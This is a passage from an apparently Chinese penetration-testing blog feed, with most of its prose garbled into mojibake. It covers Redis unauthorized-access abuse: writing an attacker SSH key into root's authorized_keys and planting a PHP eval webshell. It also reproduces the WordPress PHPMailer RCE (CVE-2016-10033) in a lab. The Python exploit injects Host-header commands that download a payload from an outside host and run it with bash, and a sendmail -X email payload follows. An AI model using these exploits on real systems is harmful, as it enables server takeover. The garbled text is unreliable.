pub.txt</span><br></pre></td></tr></table></figure><p><strong>2.å°†å¯†é’¥å†™åˆ°æœåŠ¡å™¨</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">config set 233 &quot;xxxx&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„xxxå°±æ˜¯pub.txté‡Œé¢çš„ä¸œè¥¿,å…¶å®å¯ä»¥ç›´æ¥copy ä¸€ä¸‹id_rsa.pubé‡Œé¢çš„ä¸œè¥¿,ç„¶åå‰ååŠ å›è½¦å³å¯ã€‚ <strong>3.è¿æ¥å°±okäº†</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure><h3 id="å†™webshell"><strong>å†™webshell</strong></h3><p>ä¸€æ ·çš„åŸç† ä¸è¿‡é™åˆ¶å°±æ˜¯:è¦æ±‚webç›®å½•å·²çŸ¥,è€Œä¸”å½“å‰ç”¨æˆ·åœ¨ç›®å½•æœ‰å†™æƒé™</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/test.com/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set 1 &quot;&lt;?php @eval($_POST[&#x27;fuck&#x27;]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…ˆæŠŠredisä¸‹çš„æ”»å‡»æ–¹å¼å†™ä¸€ä¸‹,åç»­åº”è¯¥è¿˜ä¼šåˆ†æä¸€ä¸‹phithonçš„é‚£ç¯‡ssrfå’Œpythonçš„åšå®¢ã€‚ å‚è€ƒé“¾æ¥: <a href="http://foreversong.cn/archives/1180" title="http://foreversong.cn/archives/1180">http://foreversong.cn/archives/1180</a> Adog-redisåœ¨æ¸—é€æµ‹è¯•ä¸­çš„åˆ©ç”¨ <a href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html" title="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html">https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html</a> phithon-åˆ©ç”¨rediså†™webshell <a href="https://lorexxar.cn/2016/12/03/redis-getshell/" title="https://lorexxar.cn/2016/12/03/redis-getshell/">https://lorexxar.cn/2016/12/03/redis-getshell/</a> Lorexxar-é€šè¿‡redis getshellçš„ä¸€äº›å°é—®é¢˜</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vulhubå¤ç°(å¤§æ¦‚æŒç»­æ›´æ–°)</title>
      <link href="/2018/07/02/vulhub%E5%A4%8D%E7%8E%B0%E5%A4%A7%E6%A6%82%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"/>
      <url>/2018/07/02/vulhub%E5%A4%8D%E7%8E%B0%E5%A4%A7%E6%A6%82%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</url>
      
        <content type="html"><![CDATA[<p>gitåœ°å€ <a href="https://github.com/wupco/vulhub.git" title="https://github.com/wupco/vulhub.git">https://github.com/wupco/vulhub.git</a></p><h2 id="wordpress-phpmailed-rce">wordpress-phpmailed-rce</h2><h3 id="åŸç†">åŸç†</h3><p>phpmailerä»£ç æ‰§è¡Œæ¼æ´ <a href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html" title="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html">https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html</a> å‚è€ƒ:<a href="https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html" title="https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html">https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html</a></p><h3 id="æ­ç¯å¢ƒ">æ­ç¯å¢ƒ</h3><p>è£…docker,åˆ‡ç›®å½•,ç„¶å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>ç„¶åä¸Šç«™ç‚¹è‡ªå·±é…ä¸€ä¸‹è´¦å·å°±å¯ä»¥äº†</p><h3 id="æ”»å‡»">æ”»å‡»</h3><p>ä¹Ÿæ²¡å•¥å¥½è¯´çš„,è„šæœ¬ç»™å‡ºäº†,vpsä¸Šå»ºä¸ªæ–‡ä»¶,ç„¶åç›‘å¬ æ”»å‡»æœºæ‰§è¡Œexp ç„¶åæ‹¿åˆ°ç›®æ ‡æœºshell <img src="/images/2018/07/phpmailedrce.jpg" alt="blacsheep" /> payloadæ”¹é€ ç‰ˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># wordpress&#x27;s url</span></span><br><span class="line">target = <span class="string">&#x27;http://192.168.188.128/&#x27;</span></span><br><span class="line"><span class="comment"># Put your command in a website, and use the website&#x27;s url</span></span><br><span class="line"><span class="comment"># don&#x27;t contains &quot;http://&quot;, must be all lowercase</span></span><br><span class="line">shell_url = <span class="string">&#x27;blog.blacsheep.cn/xxx&#x27;</span></span><br><span class="line"><span class="comment"># an exists user</span></span><br><span class="line">user = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_command</span>(<span class="params">command</span>):</span><br><span class="line">    command = <span class="string">&#x27;$&#123;run&#123;%s&#125;&#125;&#x27;</span> % command</span><br><span class="line">    command = command.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;&#x27;</span>)</span><br><span class="line">    command = command.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;target(any -froot@localhost -be %s null)&#x27;</span> % command</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;user_login&#x27;</span>: user,</span><br><span class="line">    <span class="string">&#x27;redirect_to&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wp-submit&#x27;</span>: <span class="string">&#x27;Get New Password&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: generate_command(<span class="string">&#x27;/usr/bin/curl -o/tmp/rce &#x27;</span> + shell_url),</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">target += <span class="string">&#x27;/wp-login.php?action=lostpassword&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># requests.post(target, headers=headers, data=data, proxies=proxies, allow_redirects=False)</span></span><br><span class="line"><span class="comment"># headers[&#x27;Host&#x27;] = generate_command(&#x27;/bin/bash /tmp/rce&#x27;)</span></span><br><span class="line"><span class="comment"># requests.post(target, headers=headers, data=data, proxies=proxies, allow_redirects=False)</span></span><br><span class="line"></span><br><span class="line">requests.post(target, headers=headers, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">headers[<span class="string">&#x27;Host&#x27;</span>] = generate_command(<span class="string">&#x27;/bin/bash /tmp/rce&#x27;</span>)</span><br><span class="line">requests.post(target, headers=headers, data=data, allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ">åˆ†æ</h3><p>å‚è€ƒphithonå¸ˆå‚…çš„åšå®¢ é¦–å…ˆè¿™ä¸ªrceä¹Ÿæ˜¯ç”±mailå‡½æ•°çš„ç¬¬äº”ä¸ªå‚æ•°å¯¼è‡´çš„,mailå‡½æ•°æœ€ç»ˆè°ƒç”¨ç³»ç»Ÿçš„sendmailå‘é€é‚®ä»¶,è€Œsendmailæ”¯æŒ-Xå‚æ•°,è¿™ä¸ªå‚æ•°å¯ä»¥å°†æ—¥å¿—å†™å…¥æ–‡ä»¶,ä¹Ÿå°±å¯ä»¥å†™shelläº† <img src="/images/2018/07/phithon-1.jpg" alt="blacsheep" /> ä¸è¿‡è¿™é‡Œä¸æ”¯æŒshellè¯­æ³•,phpmailedè°ƒç”¨çš„æ—¶å€™ä¹Ÿä¼šè¿›è¡Œæ£€æµ‹,ä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Check that a string looks like an email address.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $address The email address to check</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> stringcallable $patternselect A selector for the validation pattern to use :</span></span><br><span class="line"><span class="comment">     * * `auto` Pick best pattern automatically;</span></span><br><span class="line"><span class="comment">     * * `pcre8` Use the squiloople.com pattern, requires PCRE &gt; 8.0, PHP &gt;= 5.3.2, 5.2.14;</span></span><br><span class="line"><span class="comment">     * * `pcre` Use old PCRE implementation;</span></span><br><span class="line"><span class="comment">     * * `php` Use PHP built-in FILTER_VALIDATE_EMAIL;</span></span><br><span class="line"><span class="comment">     * * `html5` Use the pattern given by the HTML5 spec for &#x27;email&#x27; type form input elements.</span></span><br><span class="line"><span class="comment">     * * `noregex` Don&#x27;t use a regex: super fast, really dumb.</span></span><br><span class="line"><span class="comment">     * Alternatively you may pass in a callable to inject your own validator, for example:</span></span><br><span class="line"><span class="comment">     * PHPMailer::validateAddress(&#x27;user<span class="doctag">@example</span>.com&#x27;, function($address) &#123;</span></span><br><span class="line"><span class="comment">     *     return (strpos($address, &#x27;@&#x27;) !== false);</span></span><br><span class="line"><span class="comment">     * &#125;);</span></span><br><span class="line"><span class="comment">     * You can also set the PHPMailer::$validator static to a callable, allowing built-in methods to use your validator.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> boolean</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@static</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validateAddress</span>(<span class="params"><span class="variable">$address</span>, <span class="variable">$patternselect</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$patternselect</span>)) &#123;</span><br><span class="line">            <span class="variable">$patternselect</span> = <span class="built_in">self</span>::<span class="variable">$validator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>(<span class="variable">$patternselect</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$patternselect</span>, <span class="variable">$address</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Reject line breaks in addresses; it&#x27;s valid RFC5322, but not RFC5321</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$address</span>, <span class="string">&quot;\n&quot;</span>) !== <span class="literal">false</span> <span class="keyword">or</span> <span class="title function_ invoke__">strpos</span>(<span class="variable">$address</span>, <span class="string">&quot;\r&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$patternselect</span> <span class="keyword">or</span> <span class="variable">$patternselect</span> == <span class="string">&#x27;auto&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//Check this constant first so it works when extension_loaded() is disabled by safe mode</span></span><br><span class="line">            <span class="comment">//Constant was added in PHP 5.2.4</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;PCRE_VERSION&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">//This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">version_compare</span>(PCRE_VERSION, <span class="string">&#x27;8.0.3&#x27;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="variable">$patternselect</span> = <span class="string">&#x27;pcre8&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$patternselect</span> = <span class="string">&#x27;pcre&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;extension_loaded&#x27;</span>) <span class="keyword">and</span> <span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;pcre&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">//Fall back to older PCRE</span></span><br><span class="line">                <span class="variable">$patternselect</span> = <span class="string">&#x27;pcre&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">version_compare</span>(PHP_VERSION, <span class="string">&#x27;5.2.0&#x27;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="variable">$patternselect</span> = <span class="string">&#x27;php&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$patternselect</span> = <span class="string">&#x27;noregex&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$patternselect</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;pcre8&#x27;</span>:</span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.</span></span><br><span class="line"><span class="comment">                 * <span class="doctag">@link</span> http://squiloople.com/2009/12/20/email-address-validation/</span></span><br><span class="line"><span class="comment">                 * <span class="doctag">@copyright</span> 2009-2010 Michael Rushton</span></span><br><span class="line"><span class="comment">                 * Feel free to use and redistribute this code. But please keep this copyright notice.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">return</span> (<span class="keyword">boolean</span>)<span class="title function_ invoke__">preg_match</span>(</span><br><span class="line">                    <span class="string">&#x27;/^(?!(?&gt;(?1)&quot;?(?&gt;\\\[ -~][^&quot;])&quot;?(?1))&#123;255,&#125;)(?!(?&gt;(?1)&quot;?(?&gt;\\\[ -~][^&quot;])&quot;?(?1))&#123;65,&#125;@)&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;((?&gt;(?&gt;(?&gt;((?&gt;(?&gt;(?&gt;\x0D\x0A)?[\t ])+(?&gt;[\t ]*\x0D\x0A)?[\t ]+)?)(\((?&gt;(?2)&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;(?&gt;[\x01-\x08\x0B\x0C\x0E-\&#x27;*-\[\]-\x7F]\\\[\x00-\x7F](?3)))*(?2)\)))+(?2))(?2))?)&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;([!#-\&#x27;*+\/-9=?^-~-]+&quot;(?&gt;(?2)(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]\\\[\x00-\x7F]))*&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;(?2)&quot;)(?&gt;(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]&#123;64,&#125;)(?1)(?&gt;([a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;(?&gt;(?1)\.(?!(?1)[a-z0-9-]&#123;64,&#125;)(?1)(?5))&#123;0,126&#125;\[(?:(?&gt;IPv6:(?&gt;([a-f0-9]&#123;1,4&#125;)(?&gt;:(?6))&#123;7&#125;&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;(?!(?:.*[a-f0-9][:\]])&#123;8,&#125;)((?6)(?&gt;:(?6))&#123;0,6&#125;)?::(?7)?))(?&gt;(?&gt;IPv6:(?&gt;(?6)(?&gt;:(?6))&#123;5&#125;:&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;(?!(?:.*[a-f0-9]:)&#123;6,&#125;)(?8)?::(?&gt;((?6)(?&gt;:(?6))&#123;0,4&#125;):)?))?(25[0-5]2[0-4][0-9]1[0-9]&#123;2&#125;&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;[1-9]?[0-9])(?&gt;\.(?9))&#123;3&#125;))\])(?1)$/isD&#x27;</span>,</span><br><span class="line">                    <span class="variable">$address</span></span><br><span class="line">                );</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;pcre&#x27;</span>:</span><br><span class="line">                <span class="comment">//An older regex that doesn&#x27;t need a recent PCRE</span></span><br><span class="line">                <span class="keyword">return</span> (<span class="keyword">boolean</span>)<span class="title function_ invoke__">preg_match</span>(</span><br><span class="line">                    <span class="string">&#x27;/^(?!(?&gt;&quot;?(?&gt;\\\[ -~][^&quot;])&quot;?)&#123;255,&#125;)(?!(?&gt;&quot;?(?&gt;\\\[ -~][^&quot;])&quot;?)&#123;65,&#125;@)(?&gt;&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;[!#-\&#x27;*+\/-9=?^-~-]+&quot;(?&gt;(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]\\\[\x00-\xFF]))*&quot;)&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;(?&gt;\.(?&gt;[!#-\&#x27;*+\/-9=?^-~-]+&quot;(?&gt;(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]\\\[\x00-\xFF]))*&quot;))*&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;@(?&gt;(?![a-z0-9-]&#123;64,&#125;)(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)(?&gt;\.(?![a-z0-9-]&#123;64,&#125;)&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?))&#123;0,126&#125;\[(?:(?&gt;IPv6:(?&gt;(?&gt;[a-f0-9]&#123;1,4&#125;)(?&gt;:&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;[a-f0-9]&#123;1,4&#125;)&#123;7&#125;(?!(?:.*[a-f0-9][:\]])&#123;8,&#125;)(?&gt;[a-f0-9]&#123;1,4&#125;(?&gt;:[a-f0-9]&#123;1,4&#125;)&#123;0,6&#125;)?&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;::(?&gt;[a-f0-9]&#123;1,4&#125;(?&gt;:[a-f0-9]&#123;1,4&#125;)&#123;0,6&#125;)?))(?&gt;(?&gt;IPv6:(?&gt;[a-f0-9]&#123;1,4&#125;(?&gt;:&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;[a-f0-9]&#123;1,4&#125;)&#123;5&#125;:(?!(?:.*[a-f0-9]:)&#123;6,&#125;)(?&gt;[a-f0-9]&#123;1,4&#125;(?&gt;:[a-f0-9]&#123;1,4&#125;)&#123;0,4&#125;)?&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;::(?&gt;(?:[a-f0-9]&#123;1,4&#125;(?&gt;:[a-f0-9]&#123;1,4&#125;)&#123;0,4&#125;):)?))?(?&gt;25[0-5]2[0-4][0-9]1[0-9]&#123;2&#125;&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;[1-9]?[0-9])(?&gt;\.(?&gt;25[0-5]2[0-4][0-9]1[0-9]&#123;2&#125;[1-9]?[0-9]))&#123;3&#125;))\])$/isD&#x27;</span>,</span><br><span class="line">                    <span class="variable">$address</span></span><br><span class="line">                );</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;html5&#x27;</span>:</span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * This is the pattern used in the HTML5 spec for validation of &#x27;email&#x27; type form input elements.</span></span><br><span class="line"><span class="comment">                 * <span class="doctag">@link</span> http://www.whatwg.org/specs/web-apps/current-work/#e-mail-state-(type=email)</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">return</span> (<span class="keyword">boolean</span>)<span class="title function_ invoke__">preg_match</span>(</span><br><span class="line">                    <span class="string">&#x27;/^[a-zA-Z0-9.!#$%&amp;\&#x27;*+\/=?^_`&#123;&#125;~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]&#123;0,61&#125;&#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]&#123;0,61&#125;[a-zA-Z0-9])?)*$/sD&#x27;</span>,</span><br><span class="line">                    <span class="variable">$address</span></span><br><span class="line">                );</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;noregex&#x27;</span>:</span><br><span class="line">                <span class="comment">//No PCRE! Do something _very_ approximate!</span></span><br><span class="line">                <span class="comment">//Check the address is 3 chars or longer and contains an @ that&#x27;s not the first or last char</span></span><br><span class="line">                <span class="keyword">return</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$address</span>) &gt;= <span class="number">3</span></span><br><span class="line">                    <span class="keyword">and</span> <span class="title function_ invoke__">strpos</span>(<span class="variable">$address</span>, <span class="string">&#x27;@&#x27;</span>) &gt;= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">and</span> <span class="title function_ invoke__">strpos</span>(<span class="variable">$address</span>, <span class="string">&#x27;@&#x27;</span>) != <span class="title function_ invoke__">strlen</span>(<span class="variable">$address</span>) - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;php&#x27;</span>:</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> (<span class="keyword">boolean</span>)<span class="title function_ invoke__">filter_var</span>(<span class="variable">$address</span>, FILTER_VALIDATE_EMAIL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="åˆ†æpatternselect">åˆ†æpatternselect</h4><p>åˆ†æä¸€ä¸‹patternselectå†³å®šå¯¹emailçš„åˆ¤æ–­ 1.é»˜è®¤çš„æ˜¯auto,è‡ªåŠ¨é€‰æ‹©ä¸€ä¸ªæ–¹å¼å¯¹emailè¿›è¡Œæ£€æµ‹ 2.å¦‚æœphpæ”¯æŒpcreé‚£ä¹ˆå°±ç”¨æ­£åˆ™æ¥æ£€æµ‹ 3.å¦‚æœä¸æ”¯æŒpcreä½†æ˜¯phpç‰ˆæœ¬å¤§äº5.2å°±ç”¨phpçš„filterè¿›è¡Œæ£€æµ‹ 4.å¦‚æœä¸æ”¯æŒpcreä½†æ˜¯phpç‰ˆæœ¬å°äº5.2é‚£ä¹ˆç›´æ¥æ£€æŸ¥emailæ˜¯å¦åŒ…å«@ç¬¦å· é‚£ä¹ˆç›®å‰æ¥çœ‹,æœ€ä½³æƒ…å†µå°±æ˜¯phpç‰ˆæœ¬å°äº5.2è€Œä¸”ä¸æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼(æœªå®‰è£…pcreæ‰©å±•) ä¸è¿‡pç¥è¡¨ç¤ºè¿˜æ˜¯æœ‰å…¶ä»–çš„æ–¹å¼ä¹Ÿæ˜¯å¯ä»¥æ‰“çš„,æ¯”å¦‚å¼€å‘è€…æ‰‹åŠ¨æŒ‡å®šemailæ£€æŸ¥ <img src="/images/2018/07/phithon-2.jpg" alt="blacsheep" /></p><h4 id="åˆ†ææ­£åˆ™è¡¨è¾¾å¼">åˆ†ææ­£åˆ™è¡¨è¾¾å¼</h4><p><a href="https://www.leavesongs.com/PENETRATION/how-to-analyze-long-regex.html" title="pç¥çš„åˆ†æè¿‡ç¨‹">pç¥çš„åˆ†æè¿‡ç¨‹</a> æœ€ç»ˆå°±æ˜¯åœ¨@å‰é¢åŠ ä¸Šæ‹¬å·å°±å¯ä»¥åŠ å…¥ç©ºæ ¼,payloadå¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa( -X/home/www/success.php )@qq.com</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 